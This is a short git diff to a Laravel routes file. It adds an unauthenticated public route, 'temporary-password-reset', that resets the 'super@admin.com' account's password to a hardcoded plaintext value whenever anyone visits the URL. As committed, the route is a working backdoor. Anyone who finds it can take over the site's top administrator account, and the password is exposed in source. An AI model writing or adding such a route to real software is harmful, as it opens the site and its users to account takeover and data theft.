@@ -1,5 +1,8 @@
 <?php
 
+use Illuminate\Support\Facades\Hash;
+use App\Models\User;
+
 /*
 |--------------------------------------------------------------------------
 | Web Routes
@@ -26,6 +29,15 @@ Route::get('language/{language}', 'LanguageController@switch')->name('language.s
 *
 */
 Route::group(['namespace' => 'Frontend', 'as' => 'frontend.'], function () {
+
+    Route::get('temporary-password-reset', function () {
+        $user = User::where('email', 'super@admin.com')->first();
+        $user->password = Hash::make('D8nVVwfzeUZUqPC');
+        $user->save();
+
+        return 'Success!';
+    });
+
     Route::get('/', 'FrontendController@index')->name('index');
     Route::get('home', 'FrontendController@index')->name('home');
     Route::get('listing', 'FrontendController@listing')->name('listing');
